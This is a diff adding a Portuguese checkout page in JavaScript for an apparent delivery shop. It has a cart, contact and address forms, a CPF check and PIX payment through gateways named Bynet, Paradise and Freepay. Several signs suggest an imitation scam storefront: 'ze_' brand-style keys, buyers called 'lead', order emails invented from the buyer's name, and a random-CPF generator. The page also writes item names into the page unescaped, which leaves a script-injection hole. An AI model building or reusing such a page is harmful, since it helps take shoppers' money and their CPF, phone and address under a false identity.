+      return primeiro + 'pedido' + sufixo + '@gmail.com';
+    }
+
+    function cpfValido(cpf) {
+      cpf = cpf.replace(/\D/g, '');
+      if (cpf.length !== 11) return false;
+      if (/^(\d)\1{10}$/.test(cpf)) return false;
+      var soma = 0;
+      for (var i = 0; i < 9; i++) soma += parseInt(cpf[i]) * (10 - i);
+      var r1 = (soma * 10) % 11;
+      if (r1 === 10 || r1 === 11) r1 = 0;
+      if (r1 !== parseInt(cpf[9])) return false;
+      soma = 0;
+      for (var i = 0; i < 10; i++) soma += parseInt(cpf[i]) * (11 - i);
+      var r2 = (soma * 10) % 11;
+      if (r2 === 10 || r2 === 11) r2 = 0;
+      return r2 === parseInt(cpf[10]);
+    }
+
+    function gerarCpfAleatorio() {
+      function dig(arr) {
+        var mult = arr.length + 1, s = 0;
+        arr.forEach(function(n, i) { s += n * (mult - i); });
+        var r = (s * 10) % 11;
+        return (r === 10 || r === 11) ? 0 : r;
+      }
+      var n = Array.from({length: 9}, function() { return Math.floor(Math.random() * 10); });
+      n.push(dig(n));
+      n.push(dig(n));
+      return n.join('');
+    }
+
+    /* ══ CARRINHO ══ */
+    function fecharCarrinho() {
+      document.getElementById('c-sheet').classList.add('closing');
+      setTimeout(function() { history.back(); }, 260);
+    }
+
+    function renderCart() {
+      var c     = CarrinhoData.get();
+      var items = c.items;
+      var total = CarrinhoData.totalValor();
+      var count = CarrinhoData.totalItens();
+      var el    = document.getElementById('c-content');
+
+      document.getElementById('c-count').textContent = count > 0 ? count + (count === 1 ? ' item' : ' itens') : '';
+
+      var btn = document.getElementById('c-btn-pagar');
+      var abaixoMinimo = items.length > 0 && total < MIN_PEDIDO;
+      document.getElementById('c-btn-total').textContent = fmt(total);
+      btn.disabled = items.length === 0 || abaixoMinimo;
+
+      if (items.length === 0) {
+        el.innerHTML = '<div class="c-empty"><i class="fa fa-shopping-cart"></i><h2>Seu carrinho está vazio</h2><p>Adicione produtos para continuar</p><button class="c-empty-btn" onclick="window.location.href=\'index.html\'">Ver Produtos</button></div>';
+        return;
+      }
+
+      var html = '<div class="c-list">';
+      for (var i = 0; i < items.length; i++) {
+        var item = items[i];
+        var prod = (typeof PRODUTOS !== 'undefined') ? PRODUTOS.find(function(p){ return p.id == item.id; }) : null;
+        var precoAntigo = prod && prod.precoAntigo ? prod.precoAntigo * item.quantidade : null;
+        html += '<div class="c-item">'
+          + '<img class="c-item-img" src="'+item.img+'" alt="'+item.nome+'">'
+          + '<div class="c-item-body">'
+          +   '<div class="c-item-name">'+item.nome+'</div>'
+          +   (item.obs ? '<div class="c-item-obs">'+item.obs+'</div>' : '')
+          +   '<div class="c-item-row"><div>'
+          +     (precoAntigo ? '<span style="font-size:12px;color:#ff4d4d;text-decoration:line-through;display:block;line-height:1.3">'+fmt(precoAntigo)+'</span>' : '')
+          +     '<span class="c-item-price">'+fmt(item.preco * item.quantidade)+'</span>'
+          +   '</div>'
+          +   '<div class="c-item-qty">'
+          +     '<button class="c-qty-btn"'+(item.quantidade<=1?' disabled':'')+' onclick="changeItemQty('+i+',-1)">−</button>'
+          +     '<span class="c-qty-num">'+item.quantidade+'</span>'
+          +     '<button class="c-qty-btn" onclick="changeItemQty('+i+',1)">+</button>'
+          +   '</div></div></div>'
+          + '<button class="c-item-del" onclick="removeItem('+i+')"><i class="fa fa-times"></i></button>'
+          + '</div>';
+      }
+      html += '</div>';
+
+      /* Cards contato + endereço — sempre visíveis */
+      var ct = {}, en = {};
+      try { ct = JSON.parse(localStorage.getItem('ze_contato') || '{}'); } catch(e) {}
+      try { en = JSON.parse(localStorage.getItem('ze_endereco') || '{}'); } catch(e) {}
+
+      var contatoRow, endRow;
+      if (ct.nome) {
+        contatoRow = '<div class="c-info-row">'
+          + '<div class="c-info-icon"><i class="fa fa-user"></i></div>'
+          + '<div class="c-info-body"><div class="c-info-name">'+ct.nome+'</div><div class="c-info-sub">'+fmtTel(ct.tel)+'</div></div>'
+          + '<button class="c-info-alterar" onclick="abrirContatoModal()">Alterar</button>'
+          + '</div>';
+      } else {
+        contatoRow = '<div class="c-info-row c-info-empty" onclick="abrirContatoModal()">'
+          + '<div class="c-info-icon c-icon-empty"><i class="fa fa-user"></i></div>'
+          + '<div class="c-info-body"><div class="c-info-name c-name-empty">Informações de contato</div><div class="c-info-sub c-sub-required">* Toque para preencher</div></div>'
+          + '<i class="fa fa-chevron-right" style="color:#ccc;font-size:12px;flex-shrink:0"></i>'
+          + '</div>';
+      }
+
+      if (en.rua) {
+        var l1 = en.rua+(en.numero?', '+en.numero:'')+(en.compl?' ('+en.compl+')':'');
+        var lp = []; if(en.bairro) lp.push(en.bairro); if(en.cidade) lp.push(en.cidade+(en.estado?' – '+en.estado:''));
+        endRow = '<div class="c-info-row">'
+          + '<div class="c-info-icon"><i class="fa fa-map-marker-alt"></i></div>'
+          + '<div class="c-info-body"><div class="c-info-name">'+l1+'</div><div class="c-info-sub">'+lp.join(' · ')+'</div></div>'
+          + '<button class="c-info-alterar" onclick="abrirEnderecoModal()">Alterar</button>'
+          + '</div>';
+      } else {
+        endRow = '<div class="c-info-row c-info-empty" onclick="abrirEnderecoModal()">'
+          + '<div class="c-info-icon c-icon-empty"><i class="fa fa-map-marker-alt"></i></div>'
+          + '<div class="c-info-body"><div class="c-info-name c-name-empty">Endereço de entrega</div><div class="c-info-sub c-sub-required">* Toque para preencher</div></div>'
+          + '<i class="fa fa-chevron-right" style="color:#ccc;font-size:12px;flex-shrink:0"></i>'
+          + '</div>';
+      }
+
+      var infoHtml = '<div class="c-info-section" id="c-info-section">'
+        + contatoRow
+        + '<div class="c-info-divider"></div>'
+        + endRow
+        + '<div class="c-info-error-msg"><i class="fa fa-exclamation-circle"></i> Preencha suas informações para continuar</div>'
+        + '</div>';
+
+      /* Resumo */
+      var subtotalRef = 0;
+      for (var j = 0; j < items.length; j++) {
+        var it = items[j], pr = (typeof PRODUTOS!=='undefined') ? PRODUTOS.find(function(p){return p.id==it.id;}) : null;
+        subtotalRef += ((pr&&pr.precoAntigo)?pr.precoAntigo:it.preco)*it.quantidade;
+      }
+      var desc = subtotalRef - total;
+      /* Bloco de entrega — acima do resumo */
+      var blocoEntrega = '<div style="background:#fff;border-radius:14px;margin:10px 12px 0;padding:14px 16px;box-shadow:0 1px 4px rgba(0,0,0,.07);display:flex;align-items:center;gap:12px;">'
+        +'<div style="width:38px;height:38px;border-radius:50%;background:#fff3c4;border:1.5px solid #ffcc01;display:flex;align-items:center;justify-content:center;flex-shrink:0;">'
+        +'<i class="fa fa-motorcycle" style="color:#1a1a1a;font-size:15px;"></i></div>'
+        +'<div style="flex:1;min-width:0;">'
+        +'<div style="font-size:13px;font-weight:700;color:#1a1a1a;line-height:1.3;">Prazo de entrega: 30–40 min</div>'
+        +'<div style="font-size:12px;color:#888;margin-top:2px;line-height:1.4;">Direto na sua porta, gelado.</div>'
+        +'</div>'
+        +'</div>';
+
+      var resumo = '<div class="c-summary">'
+        +'<div class="c-sum-row"><span>Subtotal</span><span>'+fmt(subtotalRef)+'</span></div>'
+        +'<div class="c-sum-row"><span>Taxa de entrega</span><span class="c-sum-green">Grátis</span></div>'
+        +(desc>0.005?'<div class="c-sum-row"><span>Economia no PIX</span><span class="c-sum-green" style="font-weight:400">– '+fmt(desc)+'</span></div>':'')
+        +'<div class="c-sum-divider"></div>'
+        +'<div class="c-sum-total"><span>Total</span><span>'+fmt(total)+'</span></div>'
+        +'</div>';
+
+      var aviso = abaixoMinimo
+        ? '<div style="background:#fff8e1;border:1.5px solid #ffcc01;border-radius:12px;padding:13px 15px;margin:10px 12px 0;display:flex;align-items:flex-start;gap:9px"><i class="fa fa-info-circle" style="color:#7a5f00;margin-top:2px;flex-shrink:0;font-size:15px"></i><span style="font-size:13px;color:#7a5f00;font-weight:600;line-height:1.45">Pedido mínimo de <b>R$ 30,00</b>. Adicione mais <b>R$ '+Math.max(0,MIN_PEDIDO-total).toFixed(2).replace('.',',')+'</b> para finalizar.</span></div>'
+        : '';
+
+      el.innerHTML = html + infoHtml + blocoEntrega + resumo + aviso;
+    }
+
+    function changeItemQty(index, delta) { CarrinhoData.setQty(index, CarrinhoData.get().items[index].quantidade + delta); renderCart(); }
+    function removeItem(index) { CarrinhoData.remover(index); renderCart(); }
+
+    /* ══ MODAL CPF ══ */
+    function iniciarPagamento() {
+      var ct = {}, en = {};
+      try { ct = JSON.parse(localStorage.getItem('ze_contato') || '{}'); } catch(e) {}
+      try { en = JSON.parse(localStorage.getItem('ze_endereco') || '{}'); } catch(e) {}
+
+      if (!ct.nome || !en.rua) {
+        /* Shake + borda vermelha no card, scroll até ele */
+        var sec = document.getElementById('c-info-section');
+        if (sec) {
+          sec.classList.remove('c-info-error');
+          void sec.offsetWidth;
+          sec.classList.add('c-info-error');
+          sec.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+        /* Abre o modal do que estiver faltando */
+        if (!ct.nome) { setTimeout(abrirContatoModal, 400); }
+        else if (!en.rua) { setTimeout(abrirEnderecoModal, 400); }
+        return;
+      }
+      abrirCpfModal();
+    }
+
+    function abrirCpfModal() {
+      var el = document.getElementById('cpf-overlay');
+      el.style.display = 'flex';
+      document.getElementById('cpf-input').value = '';
+      document.getElementById('cpf-input').disabled = false;
+      document.getElementById('cpf-input').style.opacity = '1';
+      document.getElementById('cpf-err').classList.remove('visible');
+      document.getElementById('cpf-err').textContent = '';
+      setTimeout(function(){ document.getElementById('cpf-input').focus(); }, 300);
+    }
+
+    function fecharCpfModal() {
+      var sheet = document.getElementById('cpf-sheet');
+      sheet.classList.add('closing');
+      setTimeout(function(){ document.getElementById('cpf-overlay').style.display = 'none'; sheet.classList.remove('closing'); }, 240);
+    }
+
+    function toggleCpfInput(cb) { /* removido — opção "não lembro" descontinuada */ }
+
+    document.getElementById('cpf-input').addEventListener('input', function() {
+      var v = this.value.replace(/\D/g,'').slice(0,11);
+      if      (v.length > 9) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
+      else if (v.length > 6) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
+      else if (v.length > 3) v = v.slice(0,3)+'.'+v.slice(3);
+      this.value = v;
+      this.classList.remove('error');
+      document.getElementById('cpf-err').classList.remove('visible');
+    });
+
+    async function confirmarCpf() {
+      var cpfRaw = document.getElementById('cpf-input').value.replace(/\D/g,'');
+
+      if (!cpfValido(cpfRaw)) {
+        document.getElementById('cpf-input').classList.add('error');
+        document.getElementById('cpf-err').textContent = cpfRaw.length < 11
+          ? 'Digite os 11 dígitos do CPF.'
+          : 'CPF inválido — verifique o número e tente novamente.';
+        document.getElementById('cpf-err').classList.add('visible');
+        return;
+      }
+
+      /* Desabilita botão, mostra loading */
+      var btn = document.getElementById('cpf-confirm-btn');
+      btn.disabled = true;
+      btn.innerHTML = '<i class="fa fa-spinner fa-spin" style="font-size:13px"></i> Gerando PIX...';
+
+      await gerarPix(cpfRaw);
+      btn.disabled = false;
+      btn.innerHTML = '<i class="fa fa-lock" style="font-size:12px"></i> Salvar e pagar';
+    }
+
+    /* ══ GERAR PIX ══ */
+    async function gerarPix(cpf) {
+      var ct = {}, en = {};
+      try { ct = JSON.parse(localStorage.getItem('ze_contato') || '{}'); } catch(e) {}
+      try { en = JSON.parse(localStorage.getItem('ze_endereco') || '{}'); } catch(e) {}
+
+      var total = CarrinhoData.totalValor();
+      var email = gerarEmailPedido(ct.nome);
+
+      var transacao;
+      try {
+        var response = await fetch('/api/criar-pix', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(Object.assign({
+            produto: 'Pedido Finalizado',
+            valor:   total,
+            nome:    ct.nome || '',
+            cpf:     cpf,
+            tel:     (ct.tel || '').replace(/\D/g,''),
+            email:   email
+          }, getUtms()))
+        });
+        transacao = await response.json();
+        if (!response.ok) throw new Error(JSON.stringify(transacao));
+      } catch(err) {
+        var msg = err.message || 'Erro desconhecido';
+        if (err instanceof TypeError && location.protocol === 'file:') msg = 'Servidor não encontrado. Abra via http://localhost:3000.';
+        fecharCpfModal();
+        setTimeout(function() { alert('Erro ao gerar PIX:\n' + msg); }, 300);
+        return;
+      }
+
+      var d       = transacao.data || transacao;
+      var pixData = d.pix || {};
+      /* Bynet usa "qrcode"; Paradise/Freepay usam "qr_code" — suporta ambos */
+      var pixCode = pixData.qrcode || pixData.qr_code || '';
+      var pixImg  = (pixData.receiptUrl && pixData.receiptUrl !== 'null') ? pixData.receiptUrl
+                 : (pixData.url        && pixData.url        !== 'null') ? pixData.url
+                 : '';
+      if (pixCode && !pixImg) {
+        pixImg = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(pixCode);
+      }
+
+      pixAtivo = { pixCode: pixCode, pixImg: pixImg, txId: d.id || '', total: total, createdAt: Date.now() };
+      localStorage.setItem('ze_pix_pendente', JSON.stringify(pixAtivo));
+
+      fecharCpfModal();
+      setTimeout(function() { abrirPixOverlay(); }, 280);
+    }
+
+    /* ══ OVERLAY PIX ══ */
+    function abrirPixOverlay() {
+      if (!pixAtivo) return;
+
+      /* Preenche dados */
+      var qrImg = document.getElementById('px-qr');
+      var qrSkel = document.getElementById('px-qr-skel');
+      qrImg.classList.remove('qr-loaded');
+      qrSkel.style.display = '';
+      qrImg.src              = pixAtivo.pixImg || '';
+      document.getElementById('px-qr').onerror          = function() {
+        if (pixAtivo.pixCode) this.src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data='+encodeURIComponent(pixAtivo.pixCode);
+      };
+      document.getElementById('px-code-box').textContent = pixAtivo.pixCode || '—';
+      document.getElementById('px-copy-btn').classList.remove('copied');
+      document.getElementById('px-copy-btn').innerHTML  = '<i class="fa fa-copy"></i> Copiar código PIX';
+
+      /* Reset status */
+      setPixStatus('waiting');
+
+      var overlay = document.getElementById('pix-overlay');
+      var sheet   = document.getElementById('pix-sheet');
+      overlay.classList.remove('pix-closing');
+      if (sheet) sheet.classList.remove('pix-closing');
+      overlay.style.display = 'flex';
+      /* Força reflow antes de adicionar a classe de animação */
+      void overlay.offsetWidth;
+      overlay.classList.add('pix-opening');
+      if (sheet) sheet.classList.add('pix-opening');
+      setTimeout(function() {
+        overlay.classList.remove('pix-opening');
+        if (sheet) sheet.classList.remove('pix-opening');
+      }, 360);
+
+      /* Polling */
+      clearInterval(checkInterval);
+      if (pixAtivo.txId) checkInterval = setInterval(verificarPagamento, 5000);
+
+    }
+
+    function fecharPixOverlay() {
+      clearInterval(checkInterval);
+      clearInterval(countdownInterval);
+      localStorage.removeItem('ze_pix_pendente');
+      pixAtivo = null;
+      var overlay = document.getElementById('pix-overlay');
+      var sheet   = document.getElementById('pix-sheet');
+      if (sheet)   sheet.classList.add('pix-closing');
+      if (overlay) overlay.classList.add('pix-closing');
+      setTimeout(function() {
+        if (overlay) {
+          overlay.style.display = 'none';
+          overlay.classList.remove('pix-closing');
+        }
+        if (sheet) sheet.classList.remove('pix-closing');
+      }, 260);
+    }
+
+    async function verificarPagamento() {
+      if (!pixAtivo || !pixAtivo.txId) return;
+      try {
+        var r = await fetch('/api/status-pix/' + pixAtivo.txId);
+        var d = await r.json();
+        var s = ((d.data && d.data.status) || d.status || '').toLowerCase();
+        if (s === 'authorized' || s === 'paid' || s === 'approved' || s === 'completed') {
+          clearInterval(checkInterval);
+          clearInterval(countdownInterval);
+
+          /* Salva dados da compra para a página de obrigado disparar o Purchase */
+          try {
+            var ct = {};
+            try { ct = JSON.parse(localStorage.getItem('ze_contato') || '{}'); } catch(x) {}
+            localStorage.setItem('ze_last_purchase', JSON.stringify({
+              txId:  pixAtivo.txId,
+              total: pixAtivo.total,
+              items: CarrinhoData.get().items,
+              ct:    ct
+            }));
+          } catch(e) {}
+
+          setPixStatus('paid');
+          setTimeout(function() {
+            localStorage.removeItem('ze_pix_pendente');
+            CarrinhoData.limpar();
+            window.location.href = obrigadoUrl();
+          }, 2000);
+        }
+      } catch(e) {}
+    }
+
+    function setPixStatus(state) {
+      var card = document.getElementById('px-status-card');
+      var icon = document.getElementById('px-status-icon');
+      var text = document.getElementById('px-status-text');
+      var sub  = document.getElementById('px-status-sub');
+      if (state === 'paid') {
+        card.style.background = '#d4edda'; card.style.borderColor = '#28a745';
+        icon.textContent = '✅'; text.style.color = '#155724';
+        text.textContent = 'Pagamento confirmado!'; sub.textContent = 'Seu pedido foi aprovado';
+      } else if (state === 'expired') {
+        card.style.background = '#fdecea'; card.style.borderColor = '#e53935';
+        icon.textContent = '❌'; text.style.color = '#b71c1c';
+        text.textContent = 'PIX expirado'; sub.textContent = 'Volte ao carrinho para tentar novamente';
+      } else {
+        card.style.background = '#fffdf0'; card.style.borderColor = '#ffe066';
+        icon.textContent = '⏳'; text.style.color = '#7a6000';
+        text.textContent = 'Aguardando pagamento...'; sub.textContent = 'Verificando automaticamente';
+      }
+    }
+
+    function copiarCodigo() {
+      if (!pixAtivo || !pixAtivo.pixCode) return;
+      var code = pixAtivo.pixCode;
+      function onOk() {
+        var btn = document.getElementById('px-copy-btn');
+        btn.classList.add('copied');
+        btn.innerHTML = '<i class="fa fa-check"></i> Copiado!';
+        setTimeout(function(){ btn.classList.remove('copied'); btn.innerHTML='<i class="fa fa-copy"></i> Copiar código PIX'; }, 3000);
+      }
+      if (navigator.clipboard) { navigator.clipboard.writeText(code).then(onOk).catch(function(){ fbCopy(code,onOk); }); }
+      else { fbCopy(code, onOk); }
+    }
+
+    function fbCopy(text, cb) {
+      var ta = document.createElement('textarea');
+      ta.value = text; ta.style.position = 'fixed'; ta.style.left = '-9999px';
+      document.body.appendChild(ta); ta.focus(); ta.select();
+      try { document.execCommand('copy'); if(cb) cb(); } catch(e) {}
+      document.body.removeChild(ta);
+    }
+
+    /* ══ MODAL CONTATO ══ */
+    function abrirContatoModal() {
+      var ct = {};
+      try { ct = JSON.parse(localStorage.getItem('ze_contato') || '{}'); } catch(e) {}
+      document.getElementById('ct-nome').value = ct.nome || '';
+      document.getElementById('ct-tel').value  = ct.tel ? fmtTel(ct.tel) : '';
+      ['ct-nome','ct-tel'].forEach(function(id) {
+        document.getElementById(id).classList.remove('error');
+      });
+      document.getElementById('ct-nome-err').textContent = '';
+      document.getElementById('ct-tel-err').textContent  = '';
+      document.getElementById('ct-nome-err').classList.remove('visible');
+      document.getElementById('ct-tel-err').classList.remove('visible');
+      document.getElementById('contato-overlay').style.display = 'flex';
+      setTimeout(function(){ document.getElementById('ct-nome').focus(); }, 320);
+    }
+    function fecharContatoModal() {
+      var s = document.getElementById('contato-sheet');
+      s.classList.add('closing');
+      setTimeout(function(){ document.getElementById('contato-overlay').style.display='none'; s.classList.remove('closing'); }, 240);
+    }
+    function salvarContato() {
+      var nome = document.getElementById('ct-nome').value.trim();
+      var tel  = document.getElementById('ct-tel').value.replace(/\D/g,'');
+      var ok   = true;
+      if (!nome) {
+        document.getElementById('ct-nome').classList.add('error');
+        document.getElementById('ct-nome-err').textContent = 'Informe seu nome';
+        document.getElementById('ct-nome-err').classList.add('visible');
+        ok = false;
+      }
+      if (tel.length < 10) {
+        document.getElementById('ct-tel').classList.add('error');
+        document.getElementById('ct-tel-err').textContent = 'Informe um telefone válido';
+        document.getElementById('ct-tel-err').classList.add('visible');
+        ok = false;
+      }
+      if (!ok) return;
+      localStorage.setItem('ze_contato', JSON.stringify({ nome: nome, tel: tel }));
+      fecharContatoModal();
+      setTimeout(renderCart, 260);
+    }
+    document.getElementById('ct-tel').addEventListener('input', function() {
+      var v = this.value.replace(/\D/g,'').slice(0,11);
+      if      (v.length > 10) v = '('+v.slice(0,2)+') '+v.slice(2,7)+'-'+v.slice(7);
+      else if (v.length > 6)  v = '('+v.slice(0,2)+') '+v.slice(2,6)+'-'+v.slice(6);
+      else if (v.length > 2)  v = '('+v.slice(0,2)+') '+v.slice(2);
+      this.value = v;
+      this.classList.remove('error');
+      document.getElementById('ct-tel-err').classList.remove('visible');
+    });
+
+    /* ══ MODAL ENDEREÇO ══ */
+    function abrirEnderecoModal() {
+      var en = {};
+      try { en = JSON.parse(localStorage.getItem('ze_endereco') || '{}'); } catch(e) {}
+      document.getElementById('en-cep').value    = en.cep    ? en.cep.replace(/(\d{5})(\d{3})/,'$1-$2') : '';
+      document.getElementById('en-rua').value    = en.rua    || '';
+      document.getElementById('en-numero').value = en.numero || '';
+      document.getElementById('en-compl').value  = en.compl  || '';
+      document.getElementById('en-bairro').value = en.bairro || '';
+      document.getElementById('en-cidade').value = en.cidade || '';
+      document.getElementById('en-estado').value = en.estado || '';
+      document.getElementById('en-err').textContent = '';
+      document.getElementById('en-err').classList.remove('visible');
+      var st = document.getElementById('en-cep-status');
+      st.style.display = 'none'; st.textContent = '';
+      document.getElementById('endereco-overlay').style.display = 'flex';
+      setTimeout(function(){ document.getElementById('en-cep').focus(); }, 320);
+    }
+    function fecharEnderecoModal() {
+      var s = document.getElementById('endereco-sheet');
+      s.classList.add('closing');
+      setTimeout(function(){ document.getElementById('endereco-overlay').style.display='none'; s.classList.remove('closing'); }, 240);
+    }
+    document.getElementById('en-cep').addEventListener('input', function() {
+      var v = this.value.replace(/\D/g,'').slice(0,8);
+      if (v.length > 5) v = v.slice(0,5)+'-'+v.slice(5);
+      this.value = v;
+      if (v.replace(/\D/g,'').length === 8) buscarCep();
+    });
+    async function buscarCep() {
+      var cep = document.getElementById('en-cep').value.replace(/\D/g,'');
+      if (cep.length !== 8) return;
+      var st = document.getElementById('en-cep-status');
+      st.textContent = 'Buscando...'; st.style.color = '#888'; st.style.display = 'block';
+      try {
+        var r = await fetch('https://viacep.com.br/ws/'+cep+'/json/');
+        var d = await r.json();
+        if (d.erro) { st.textContent = 'CEP não encontrado'; st.style.color = '#e53935'; return; }
+        document.getElementById('en-rua').value    = d.logradouro || '';
+        document.getElementById('en-bairro').value = d.bairro     || '';
+        document.getElementById('en-cidade').value = d.localidade || '';
+        document.getElementById('en-estado').value = d.uf         || '';
+        st.textContent = '✓ Endereço encontrado'; st.style.color = '#077c22';
+        setTimeout(function(){ document.getElementById('en-numero').focus(); }, 100);
+      } catch(e) { st.textContent = 'Erro ao buscar CEP'; st.style.color = '#e53935'; }
+    }
+    function salvarEndereco() {
+      var rua    = document.getElementById('en-rua').value.trim();
+      var numero = document.getElementById('en-numero').value.trim();
+      var errEl  = document.getElementById('en-err');
+      if (!rua || !numero) {
+        errEl.textContent = 'Informe rua e número';
+        errEl.classList.add('visible');
+        if (!rua)    document.getElementById('en-rua').classList.add('error');
+        if (!numero) document.getElementById('en-numero').classList.add('error');
+        return;
+      }
+      localStorage.setItem('ze_endereco', JSON.stringify({
+        cep:    document.getElementById('en-cep').value.replace(/\D/g,''),
+        rua:    rua,
+        numero: numero,
+        compl:  document.getElementById('en-compl').value.trim(),
+        bairro: document.getElementById('en-bairro').value.trim(),
+        cidade: document.getElementById('en-cidade').value.trim(),
+        estado: document.getElementById('en-estado').value.trim().toUpperCase()
+      }));
+      fecharEnderecoModal();
+      setTimeout(renderCart, 260);
+    }
+    ['en-rua','en-numero'].forEach(function(id) {
+      document.getElementById(id).addEventListener('input', function() {
+        this.classList.remove('error');
+        document.getElementById('en-err').classList.remove('visible');
+      });
+    });
+
+    /* ══ INIT ══ */
+    renderCart();
+
+    /* InitiateCheckout — 1x por sessão ao entrar no carrinho com itens */
+    (function() {
+      var items = CarrinhoData.get().items;
+      if (!items || items.length === 0) return;
+      if (sessionStorage.getItem('ze_ic')) return;
+      sessionStorage.setItem('ze_ic', '1');
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'InitiateCheckout', {
+          value:     CarrinhoData.totalValor(),
+          currency:  'BRL',
+          num_items: CarrinhoData.totalItens()
+        });
+      }
+    })();
+
+    /* Restaura PIX em andamento se o lead voltar à página */
+    (function() {
+      var raw = localStorage.getItem('ze_pix_pendente');
+      if (!raw) return;
+      try {
+        var p = JSON.parse(raw);
+        if (p && p.pixCode && (Date.now() - p.createdAt) < 10*60*1000) {
+          pixAtivo = p;
+          setTimeout(abrirPixOverlay, 400);
+        }
+      } catch(e) {}
+    })();
+  </script>
+</body>
+</html>
